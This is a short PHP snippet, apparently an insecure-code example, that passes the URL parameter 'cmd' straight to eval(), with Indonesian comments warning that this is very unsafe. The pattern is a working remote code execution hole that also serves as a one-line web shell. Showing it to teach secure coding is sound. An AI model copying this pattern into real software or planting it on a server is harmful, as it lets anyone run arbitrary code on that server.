<?php
$user_input = $_GET['cmd'];

// Peringatan: Kode ini sangat tidak aman.
// Ia mengeksekusi input pengguna langsung dari parameter URL.
eval($user_input);
?>